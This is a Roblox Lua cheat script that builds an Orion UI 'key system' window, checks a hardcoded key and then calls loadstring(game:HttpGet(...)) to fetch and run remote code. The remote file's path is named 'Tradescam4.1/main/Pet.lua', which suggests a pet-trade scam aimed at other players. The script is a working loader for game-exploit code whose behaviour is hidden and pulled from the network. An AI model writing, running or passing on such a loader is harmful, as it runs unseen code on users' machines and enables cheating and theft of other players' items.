local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Player = game.Players.LocalPlayer

local Window = OrionLib:MakeWindow({Name = "KEY SYSTEM NAME", HidePremium = false, SaveConfig = true, IntroEnabled = false})

OrionLib:MakeNotification({

	Name = "Scarlet hub",	Content = "you logged to as ".. Player.Name.." ", 

	Image = "rbxassetid://4483345998",

	Time = 4

})

_G.Key = "key-0ow018hw91nq" 

_G.KeyInput = "string" 

function MakeScriptHub() 

      loadstring(game:HttpGet("https://raw.githubusercontent.com/SoKomgl124/Tradescam4.1/main/Pet.lua", true))()

print("EnteredCorrectKey") 

end

function CorrectKeyNotification() 

         OrionLib:MakeNotification({

	            Name = "subscribe to ROBLOcheat",

	            Content = "Welcome",

	             Image = "rbxassetid://4483345998",

	             Time = 3

         })

 end

 

function IncorrectKeyNotification() 

         OrionLib:MakeNotification({

	            Name = "Incorrect Key",

	            Content = "you have entered Incorrect key",

	            Image = "rbxassetid://4483345998",

	            Time = 5

         })

end

local Tab = Window:MakeTab({

	Name = "key",

	Icon = "rbxassetid://4483345998",

	PremiumOnly = false

})

Tab:AddTextbox({

	Name = "enter key",

	Default = "imput",

	TextDisappear = false,

	Callback = function(Value)

		_G.KeyInput = Value

	end	  

})

Tab:AddButton({

	Name = "check key",

	Callback = function()

	       if _G.KeyInput == _G.Key then

      	 MakeScriptHub() 

           CorrectKeyNotification()

           else  

                   IncorrectKeyNotification() 

  	      end  

    end 

})
